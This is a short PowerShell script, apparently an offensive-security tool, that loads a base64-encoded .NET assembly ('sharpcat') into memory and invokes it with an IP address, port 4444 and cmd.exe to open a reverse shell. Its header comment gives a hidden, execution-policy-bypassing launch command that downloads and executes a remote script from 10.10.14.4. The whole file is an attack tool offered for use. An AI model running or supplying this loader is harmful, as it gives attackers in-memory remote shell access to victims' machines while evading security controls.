# Adjust the params
# Launch with: powershell -noexit -ep bypass -nop -w hidden -Command "IEX(IWR -usebasicparsing http://10.10.14.4/sharpcat.ps1)"

param(
    [string]$IP      = "10.200.16.133",
    [int]$Port       = 4444,
    [string]$Command = "cmd.exe"
)

$b64 = "---insert your shaprcat.exe b64 here---"

$bytes = [Convert]::FromBase64String($b64)
$Assembly = [System.Reflection.Assembly]::Load($bytes)
$EntryPoint = $Assembly.GetTypes() | ForEach-Object {
    $_.GetMethod("Main", [Reflection.BindingFlags]"Static,Public,NonPublic")
} | Where-Object { $_ -ne $null }

$EntryPoint.Invoke($null, (, [string[]]@($IP, $Port, $Command)))
